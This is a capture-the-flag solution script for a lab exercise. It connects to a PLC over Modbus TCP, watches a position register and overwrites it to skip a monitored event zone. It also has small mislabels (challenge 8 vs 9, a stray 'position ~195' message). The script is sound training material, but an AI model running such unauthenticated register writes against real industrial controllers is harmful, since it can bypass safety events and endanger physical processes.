#!/usr/bin/env python3
"""
CTF Challenge 9: Position Teleporter
Difficulty: Medium
Points: 250

Objective: Manipulate the vehicle position to jump across zones instantly

Solution:
- The position value can be directly controlled if you know where to look
- Jump the position forward to skip events and zones
- The web interface will detect position manipulation and award the flag
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_08_position_teleport.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip, plc_port = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 502
    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Connection failed")
        sys.exit(1)

    print("[*] CTF Challenge 8: Position Teleporter")
    print("[*] Waiting for position ~195...")

    while True:
        pos = client.read_holding_registers(1, 1)  # current_position
        if pos.isError():
            continue

        position = pos.registers[0]
        print(f"\r[*] Position: {position:3d}", end="", flush=True)

        # When near Event 6 zone (position 15)
        if 13 <= position <= 14:
            print(f"\n[*] At position {position}, preparing to teleport!")

            # Read Event 6 counter before
            evt6_before = client.read_holding_registers(1048, 1).registers[0]  # event_6_counter
            print(f"[*] Event 6 counter before: {evt6_before}")

            # TELEPORT: Jump past Event 6 zone to position 16
            print("[*] TELEPORTING to position 16 (skipping Event 6 at position 15)...")
            client.write_register(1, 16)
            time.sleep(0.5)

            # Verify
            new_pos = client.read_holding_registers(1, 1).registers[0]
            evt6_after = client.read_holding_registers(1048, 1).registers[0]

            print(f"[+] New position: {new_pos}")
            print(f"[*] Event 6 counter after: {evt6_after}")
            print(f"[*] Jump distance: {new_pos - position}")

            if evt6_after == evt6_before:
                print("\n[+] Event 6 skipped successfully!")
                print("[+] Position teleportation complete!")
                print("[*] Check the web interface for flag capture notification")
            else:
                print("\n[!] Event 6 was triggered")

            break

        time.sleep(0.1)

    client.close()

if __name__ == "__main__":
    main()
